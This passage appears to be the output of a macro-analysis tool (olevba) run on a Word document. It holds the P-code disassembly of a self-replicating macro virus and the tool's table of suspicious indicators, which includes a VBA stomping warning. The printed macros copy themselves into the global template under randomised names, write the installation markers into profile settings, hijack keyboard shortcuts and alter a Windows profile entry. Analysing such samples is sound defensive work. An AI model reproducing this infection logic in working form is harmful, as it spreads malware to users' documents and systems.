' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St J$ 
' 	EndIf 
' Line #181:
' 	Ld E$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St J$ 
' 	EndIf 
' Line #182:
' 	Ld E$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St J$ 
' 	EndIf 
' Line #183:
' 	Ld E$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St J$ 
' 	EndIf 
' Line #184:
' 	Ld E$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St J$ 
' 	EndIf 
' Line #185:
' 	Ld E$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St J$ 
' 	EndIf 
' Line #186:
' Line #187:
' 	Ld False$ 
' 	Ld G$ 
' 	Add 
' 	Ld H$ 
' 	Add 
' 	Ld J$ 
' 	Add 
' 	St Fun$ 
' Line #188:
' 	EndFunc 
' Macros/VBA/BIAWFPJU - 8570 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn A
' Line #3:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Done 
' Line #4:
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St A$ 
' Line #6:
' 	Ld A$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Finish 
' 	EndIf 
' Line #7:
' Line #8:
' 	Ld VInstalled 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #9:
' 	ArgsCall Run1 0x0000 
' Line #10:
' 	ArgsCall Run2 0x0000 
' Line #11:
' 	ArgsCall RunPayload 0x0000 
' Line #12:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0002 
' Line #13:
' 	ElseBlock 
' Line #14:
' 	GoTo Done 
' Line #15:
' 	EndIfBlock 
' Line #16:
' Line #17:
' 	Label Done 
' Line #18:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St A$ 
' Line #19:
' 	Ld A$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #20:
' 	GoTo Finish 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	LitStr 0x0001 "e"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #23:
' 	EndIfBlock 
' Line #24:
' Line #25:
' 	Label Finish 
' Line #26:
' 	LitStr 0x0003 "COE"
' 	LitDI2 0x0008 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #27:
' 	EndSub 
' Line #28:
' Line #29:
' 	FuncDefn (Private Sub Run1())
' Line #30:
' 	Dim 
' 	VarDefn X
' Line #31:
' 	Dim 
' 	VarDefn False
' Line #32:
' 	Dim 
' 	VarDefn G
' Line #33:
' 	Dim 
' 	VarDefn H
' Line #34:
' 	Dim 
' 	VarDefn J
' Line #35:
' 	Dim 
' 	VarDefn Y
' Line #36:
' 	Dim 
' 	VarDefn Z
' Line #37:
' 	Dim 
' 	VarDefn R1
' Line #38:
' 	Dim 
' 	VarDefn CO
' Line #39:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #40:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #41:
' Line #42:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #43:
' Line #44:
' 	LitStr 0x000A "VirNameDoc"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	St R1$ 
' Line #45:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R1$ 
' 	Add 
' 	St CO$ 
' Line #46:
' 	Ld CO$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #47:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info2"
' 	Ld Z$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #48:
' 	LitDI2 0x0020 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0002 
' 	ParamNamed Category 
' 	Ld Z$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Add 
' 	LitDI2 0x0000 
' 	ParamNamed Context 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsCustomizeKeyboard 0x0005 
' Line #49:
' 	EndSub 
' Line #50:
' Line #51:
' 	FuncDefn (Private Sub Run2())
' Line #52:
' 	Dim 
' 	VarDefn X
' Line #53:
' 	Dim 
' 	VarDefn False
' Line #54:
' 	Dim 
' 	VarDefn G
' Line #55:
' 	Dim 
' 	VarDefn H
' Line #56:
' 	Dim 
' 	VarDefn J
' Line #57:
' 	Dim 
' 	VarDefn Y
' Line #58:
' 	Dim 
' 	VarDefn Z
' Line #59:
' 	Dim 
' 	VarDefn R2
' Line #60:
' 	Dim 
' 	VarDefn OC
' Line #61:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #62:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #63:
' Line #64:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #65:
' Line #66:
' 	LitStr 0x0007 "VirName"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	St R2$ 
' Line #67:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R2$ 
' 	Add 
' 	St OC$ 
' Line #68:
' 	Ld OC$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #69:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	Ld Z$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #70:
' 	LitDI2 0x0045 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0002 
' 	ParamNamed Category 
' 	Ld Z$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Add 
' 	LitDI2 0x0000 
' 	ParamNamed Context 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsCustomizeKeyboard 0x0005 
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' 	FuncDefn (Private Sub RunPayload())
' Line #74:
' 	Dim 
' 	VarDefn X
' Line #75:
' 	Dim 
' 	VarDefn False
' Line #76:
' 	Dim 
' 	VarDefn G
' Line #77:
' 	Dim 
' 	VarDefn H
' Line #78:
' 	Dim 
' 	VarDefn J
' Line #79:
' 	Dim 
' 	VarDefn Y
' Line #80:
' 	Dim 
' 	VarDefn Z
' Line #81:
' 	Dim 
' 	VarDefn R3
' Line #82:
' 	Dim 
' 	VarDefn OCO
' Line #83:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #84:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #85:
' Line #86:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #87:
' Line #88:
' 	LitStr 0x000E "VirNamePayload"
' 	Ld WordBasic 
' 	ArgsMemLd [GetDocumentVar$] 0x0001 
' 	St R3$ 
' Line #89:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R3$ 
' 	Add 
' 	St OCO$ 
' Line #90:
' 	Ld OCO$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #91:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info3"
' 	Ld Z$ 
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' 	FuncDefn (Private Function VInstalled())
' Line #95:
' 	Dim 
' 	VarDefn CC
' Line #96:
' 	Dim 
' 	VarDefn i
' Line #97:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	Ld WordBasic 
' 	ArgsMemLd [GetProfileString$] 0x0002 
' 	St CC$ 
' Line #98:
' 	LitDI2 0x0000 
' 	St VInstalled 
' Line #99:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #100:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #101:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	Ld CC$ 
' 	Eq 
' 	IfBlock 
' Line #102:
' 	LitDI2 0x0001 
' 	St VInstalled 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	EndFunc 
' Line #107:
' Line #108:
' 	FuncDefn (Private Function Fun(False, G, H, J))
' Line #109:
' 	Dim 
' 	VarDefn One
' Line #110:
' 	Dim 
' 	VarDefn Two
' Line #111:
' 	Dim 
' 	VarDefn Num
' Line #112:
' 	Dim 
' 	VarDefn A
' Line #113:
' 	Dim 
' 	VarDefn B
' Line #114:
' 	Dim 
' 	VarDefn C
' Line #115:
' 	Dim 
' 	VarDefn D
' Line #116:
' 	Dim 
' 	VarDefn E
' Line #117:
' 	LitDI2 0x0491 
' 	St One 
' Line #118:
' 	LitDI2 0x244E 
' 	St Two 
' Line #119:
' 	ArgsLd Rnd 0x0000 
' 	Ld Two 
' 	Ld One 
' 	Sub 
' 	Paren 
' 	Mul 
' 	Ld One 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St Num 
' Line #120:
' 	Ld Num 
' 	ArgsLd Str 0x0001 
' 	St A$ 
' Line #121:
' 	Ld A$ 
' 	Ld WordBasic 
' 	ArgsMemLd [LTrim$] 0x0001 
' 	St A$ 
' Line #122:
' Line #123:
' 	Ld A$ 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St B$ 
' Line #124:
' 	Ld A$ 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St C$ 
' Line #125:
' 	Ld A$ 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #126:
' 	Ld A$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St E$ 
' Line #127:
' Line #128:
' 	Ld B$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St False$ 
' 	EndIf 
' Line #129:
' 	Ld B$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St False$ 
' 	EndIf 
' Line #130:
' 	Ld B$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St False$ 
' 	EndIf 
' Line #131:
' 	Ld B$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St False$ 
' 	EndIf 
' Line #132:
' 	Ld B$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St False$ 
' 	EndIf 
' Line #133:
' 	Ld B$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St False$ 
' 	EndIf 
' Line #134:
' 	Ld B$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St False$ 
' 	EndIf 
' Line #135:
' 	Ld B$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St False$ 
' 	EndIf 
' Line #136:
' 	Ld B$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St False$ 
' 	EndIf 
' Line #137:
' 	Ld B$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St False$ 
' 	EndIf 
' Line #138:
' Line #139:
' 	Ld C$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St G$ 
' 	EndIf 
' Line #140:
' 	Ld C$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St G$ 
' 	EndIf 
' Line #141:
' 	Ld C$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St G$ 
' 	EndIf 
' Line #142:
' 	Ld C$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St G$ 
' 	EndIf 
' Line #143:
' 	Ld C$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St G$ 
' 	EndIf 
' Line #144:
' 	Ld C$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St G$ 
' 	EndIf 
' Line #145:
' 	Ld C$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St G$ 
' 	EndIf 
' Line #146:
' 	Ld C$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St G$ 
' 	EndIf 
' Line #147:
' 	Ld C$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St G$ 
' 	EndIf 
' Line #148:
' 	Ld C$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St G$ 
' 	EndIf 
' Line #149:
' Line #150:
' 	Ld D$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St H$ 
' 	EndIf 
' Line #151:
' 	Ld D$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St H$ 
' 	EndIf 
' Line #152:
' 	Ld D$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St H$ 
' 	EndIf 
' Line #153:
' 	Ld D$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St H$ 
' 	EndIf 
' Line #154:
' 	Ld D$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St H$ 
' 	EndIf 
' Line #155:
' 	Ld D$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St H$ 
' 	EndIf 
' Line #156:
' 	Ld D$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St H$ 
' 	EndIf 
' Line #157:
' 	Ld D$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St H$ 
' 	EndIf 
' Line #158:
' 	Ld D$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St H$ 
' 	EndIf 
' Line #159:
' 	Ld D$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St H$ 
' 	EndIf 
' Line #160:
' Line #161:
' 	Ld E$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St J$ 
' 	EndIf 
' Line #162:
' 	Ld E$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St J$ 
' 	EndIf 
' Line #163:
' 	Ld E$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St J$ 
' 	EndIf 
' Line #164:
' 	Ld E$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St J$ 
' 	EndIf 
' Line #165:
' 	Ld E$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St J$ 
' 	EndIf 
' Line #166:
' 	Ld E$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St J$ 
' 	EndIf 
' Line #167:
' 	Ld E$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St J$ 
' 	EndIf 
' Line #168:
' 	Ld E$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St J$ 
' 	EndIf 
' Line #169:
' 	Ld E$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St J$ 
' 	EndIf 
' Line #170:
' 	Ld E$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St J$ 
' 	EndIf 
' Line #171:
' Line #172:
' 	Ld False$ 
' 	Ld G$ 
' 	Add 
' 	Ld H$ 
' 	Add 
' 	Ld J$ 
' 	Add 
' 	St Fun$ 
' Line #173:
' 	EndFunc 
' Macros/VBA/AIHYFNFR - 935 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' Line #3:
' 	LitStr 0x0007 "windows"
' 	LitStr 0x0007 "Program"
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall SetProfileString 0x0003 
' Line #4:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |"{e                 |Intl                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

